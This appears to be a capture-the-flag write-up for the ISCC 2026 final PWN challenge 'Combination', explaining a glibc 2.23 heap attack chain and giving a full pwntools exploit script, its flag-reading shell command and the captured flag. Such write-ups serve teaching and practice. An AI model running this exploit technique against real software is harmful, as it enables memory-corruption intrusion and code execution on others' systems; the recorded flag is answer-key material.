# Combination

> **Category**: PWN | **Difficulty**: Hard | **Competition**: ISCC 2026 决赛
> **Flag**: `ISCC{b659539c-e27f-4e38-ad39-85313d0f7812}`

---

## Attack Chain

```
UAF泄露heap+libc → off-by-one构造overlapping chunk → fastbin劫持到BSS → 篡改note表任意读写 → 泄漏栈地址 → one_gadget覆写saved RIP
```

## Key Techniques

### 1. UAF信息泄露
delete分支释放chunk后仅清零size，ptr未置NULL。释放note进unsorted bin后fd/bk指向main_arena+88，通过show操作泄露heap和libc地址。

### 2. Off-by-one Null Byte
`read_until`在读满maxlen字节后追加`\x00`，溢出到下一个chunk的size最低位，清除PREV_INUSE标志位，触发glibc向后合并产生overlapping chunk。

### 3. Fastbin-to-BSS
在tinypad全局数据区(temp缓冲区+0xE0)预埋fake chunk(size=0x51)，通过overlapping chunk构造fastbin链指向BSS，使malloc返回全局数据区地址，覆盖note描述符表。

### 4. 任意读写原语
篡改note表后，edit note[2]修改note[3].ptr实现任意地址写，show note[3]实现任意地址读。

### 5. 栈劫持
通过任意读libc.environ泄漏栈地址，扫描栈帧找到`__libc_start_main`的saved RIP，用one_gadget覆写后发送Q退出main触发。

## Exploit

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# combination exploit for ISCC2026 Final
# glibc 2.23 | UAF leak + poison null byte + fastbin-to-bss + arb R/W + stack hijack
import re, sys
from pwn import *

context(arch="amd64", os="linux", log_level="info")

BINARY = "./combination_final"
LIBC   = "./libc.so.6"
HOST   = "39.96.193.120"
PORT   = 10003

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

# 关键地址常量
PAD_BASE     = elf.sym["tinypad"]       # 0x404040
FAKE_OFFSET  = 0xE0                     # temp缓冲区内fake chunk的偏移
NOTE3_PTR    = PAD_BASE + 0x128         # note[3].ptr 在BSS中的地址
ARENA88_OFF  = 0x3C4B78                 # main_arena+88 在libc中的偏移
OG_LIST      = [0x45216, 0x45226, 0x4526A, 0xF02A4, 0xF1147]

# ---------- 交互封装 ----------
def do_add(r, sz, buf):
    r.sendlineafter(b"COMMAND >> ", b"A")
    r.sendlineafter(b"MEM_SIZE >> ", str(sz).encode())
    r.sendafter(b"MEM_DATA >> ", buf + b"\n")

def do_del(r, i):
    r.sendlineafter(b"COMMAND >> ", b"D")
    r.sendlineafter(b"INDEX_ID >> ", str(i).encode())

def do_edit(r, i, buf):
    r.sendlineafter(b"COMMAND >> ", b"E")
    r.sendlineafter(b"INDEX_ID >> ", str(i).encode())
    r.sendafter(b"MEM_DATA >> ", buf + b"\n")
    r.sendlineafter(b"APPLY_CHANGE? (Y/n) >> ", b"Y")

def do_show(r):
    r.sendlineafter(b"COMMAND >> ", b"")
    return r.recvuntil(b"COMMAND >> ")

# ---------- 解析辅助 ----------
def extract_qword(raw, idx):
    tag = f"INDEX: {idx}\n # CONTENT: ".encode()
    p = raw.index(tag) + len(tag)
    seg = raw[p:raw.index(b"\n", p)]
    return u64(seg[:8].ljust(8, b"\x00"))

def extract_blob(raw, idx):
    tag = f"INDEX: {idx}\n # CONTENT: ".encode()
    p = raw.index(tag) + len(tag)
    return raw[p:raw.index(b"\n", p)]

def peek(r, idx):
    return extract_blob(do_show(r), idx)

def addr_safe(v):
    d = p64(v)
    return b"\x00" not in d[:6] and b"\x0a" not in d[:6]

# ---------- 任意读写原语 ----------
def arb_wptr(r, dst):
    """通过edit note[2]来设置note[3]的ptr字段"""
    if not addr_safe(dst):
        raise ValueError(f"ptr不可用: {dst:#x}")
    do_edit(r, 2, p64(dst))

def arb_read(r, dst):
    arb_wptr(r, dst)
    return extract_qword(do_show(r), 3)

def arb_read_raw(r, dst):
    arb_wptr(r, dst)
    return extract_blob(do_show(r), 3)

def arb_write(r, dst, val):
    arb_wptr(r, dst)
    old = peek(r, 3)
    n = len(old)
    if n < 6:
        raise ValueError(f"可写长度不足: {dst:#x} len={n}")
    chunk = p64(val)[:n]
    if b"\x0a" in chunk:
        raise ValueError(f"payload含换行: {dst:#x}")
    do_edit(r, 3, chunk)
    return n

# ---------- 栈扫描 ----------
def scan_retaddr(r, sp, libc_lo, libc_hi):
    quick = [0xF0, 0xE8, 0xD8, 0x68, 0x60]
    for off in quick:
        a = sp - off
        if not addr_safe(a):
            continue
        blob = arb_read_raw(r, a)
        if len(blob) < 6:
            continue
        v = u64(blob[:8].ljust(8, b"\x00"))
        log.info(f"快查 {a:#x} -> {v:#x}")
        if libc_lo <= v < libc_hi:
            return a, v, len(blob)
    for off in range(0x180, 0x60, -8):
        a = sp - off
        if not addr_safe(a):
            continue
        blob = arb_read_raw(r, a)
        if len(blob) < 6:
            continue
        v = u64(blob[:8].ljust(8, b"\x00"))
        log.info(f"扫描 {a:#x} -> {v:#x}")
        if libc_lo <= v < libc_hi:
            return a, v, len(blob)
    raise RuntimeError("未找到saved RIP")

# ---------- 主逻辑 ----------
def attack(og_offset):
    r = remote(HOST, PORT, timeout=10)
    try:
        # [1] 在BSS预埋fake fastbin chunk (size=0x51)
        log.info("[1] 预埋fake chunk于tinypad+0xE0")
        fake_meta = b"X" * 0xE0 + p64(0) + p64(0x51)
        do_add(r, 0x100, b"Z" * 0xF0)
        do_edit(r, 1, fake_meta)
        do_del(r, 1)

        # [2] 泄漏heap和libc
        log.info("[2] 信息泄漏")
        for c in [b"A", b"B", b"C", b"D"]:
            do_add(r, 0x80, c * 0x80)
        do_del(r, 3)
        do_del(r, 1)
        raw = r.recvuntil(b"COMMAND >> ")

        heap_val = extract_qword(raw, 1)
        libc_val = extract_qword(raw, 3)
        libc.address = libc_val - ARENA88_OFF

        environ_sym = libc.sym["environ"]
        og_addr = libc.address + og_offset
        log.success(f"heap泄漏 = {heap_val:#x}")
        log.success(f"libc基址 = {libc.address:#x}")
        log.success(f"one_gadget = {og_addr:#x}")

        if not addr_safe(og_addr):
            raise ValueError(f"one_gadget地址不可写: {og_addr:#x}")

        # [3] 清空堆，准备off-by-one布局
        log.info("[3] 重置堆状态")
        do_del(r, 2)
        do_del(r, 4)

        # [4] poison null byte布局
        log.info("[4] 构造off-by-one布局")
        do_add(r, 0x88, b"A" * 0x88)        # 源chunk，null byte击中下一个size
        do_add(r, 0x100, b"B" * 0xF0 + p64(0x100) + b"B" * 8)  # victim
        do_add(r, 0x80, b"C" * 0x80)        # 防护

        do_del(r, 2)
        do_edit(r, 1, b"Q" * 0x88)           # 触发null byte
        do_add(r, 0x80, b"b1" * 0x40)       # 从freed victim中分割
        do_add(r, 0x40, b"b2" * 0x20)       # 分割剩余

        # [5] 构造overlap + fastbin链指向BSS
        log.info("[5] 构造overlapping chunk")
        do_del(r, 2)
        do_del(r, 3)
        do_del(r, 4)

        overlap_payload = flat(
            0, 0x51, 0,
            b"A" * 0x68,
            0, 0x51,
            PAD_BASE + FAKE_OFFSET,
            b"B" * 0x28,
            0, 0x51,
            0, 0, 0,
        )
        do_add(r, len(overlap_payload), overlap_payload)
        do_add(r, 0x40, b"C" * 0x40)

        # [6] 覆盖note表，建立任意读写
        log.info("[6] 篡改note描述符表")
        smash = flat(
            b"A" * 0x18,
            environ_sym, 0x88,
            NOTE3_PTR, 0x88,
            environ_sym,
        )
        do_add(r, len(smash), smash)

        # [7] 通过environ泄漏栈地址
        log.info("[7] 泄漏栈地址")
        sp_val = extract_qword(do_show(r), 1)
        log.success(f"栈地址 = {sp_val:#x}")

        # [8] 扫描saved RIP
        log.info("[8] 定位saved RIP")
        lo = libc.address
        hi = libc.address + 0x400000
        ret_loc, old_rip, wlen = scan_retaddr(r, sp_val, lo, hi)
        log.success(f"saved RIP @ {ret_loc:#x}, 原值={old_rip:#x}, 可写{wlen}字节")

        # [9] 写入one_gadget
        log.info("[9] 覆写saved RIP为one_gadget")
        arb_write(r, ret_loc, og_addr)
        check = arb_read(r, ret_loc)
        m = (1 << (8 * min(wlen, 8))) - 1
        if (check & m) != (og_addr & m):
            raise RuntimeError("写入验证失败")

        # [10] 触发
        log.info("[10] 触发main返回")
        r.sendlineafter(b"COMMAND >> ", b"Q")
        sleep(0.3)
        r.sendline(b"cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; exit")

        out = r.recvall(timeout=8)
        hit = re.search(rb"(ISCC|flag)\{[^}]+\}", out)
        if hit:
            log.success(f"FLAG = {hit.group().decode()}")
            return hit.group().decode()
        raise RuntimeError(f"未获取flag: {out[:300]!r}")
    finally:
        r.close()

# ---------- 入口 ----------
for attempt in range(24):
    for og in OG_LIST:
        try:
            log.info(f"第{attempt+1}次尝试, one_gadget偏移={og:#x}")
            result = attack(og)
            print(result)
            sys.exit(0)
        except (EOFError, PwnlibException, RuntimeError, ValueError) as exc:
            log.warning(str(exc))

sys.exit("所有尝试均失败")
```

**运行结果：**

```
[+] FLAG = ISCC{b659539c-e27f-4e38-ad39-85313d0f7812}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| UAF泄露 | free后ptr未清空，show泄露unsorted bin的fd/bk指针 |
| Off-by-one null byte | read_until追加\x00溢出到下一chunk size，清除PREV_INUSE |
| Overlapping chunk | 向后合并产生跨越多chunk的大块，可构造多个fake fastbin chunk |
| Fastbin-to-BSS | 在全局数据区预埋fake chunk，通过fastbin链使malloc返回BSS地址 |
| 任意读写原语 | 篡改note描述符表，通过edit/show控制任意地址读写 |
| environ泄漏栈 | libc.environ存储栈环境变量指针，读出后推算saved RIP位置 |
| one_gadget | 遍历多个偏移尝试，需满足栈约束条件 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\final\combination_WriteUp.md`*
